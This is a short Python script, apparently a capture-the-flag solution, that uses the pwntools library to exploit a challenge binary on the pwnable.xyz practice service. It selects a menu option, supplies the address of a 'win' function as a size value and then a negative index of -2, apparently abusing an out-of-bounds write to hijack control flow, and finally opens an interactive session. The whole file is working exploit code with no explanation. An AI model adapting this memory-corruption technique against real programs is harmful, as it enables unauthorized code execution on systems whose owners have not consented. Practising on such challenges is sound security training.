from pwn import *

#p = process("challenge/challenge")
p = remote("svc.pwnable.xyz", 30007)

p.sendlineafter(b"> ", b"1")
win = 0x400a31
p.sendlineafter(b"Size: ", str(win).encode())
p.sendlineafter(b"> ", b"-2")
p.interactive()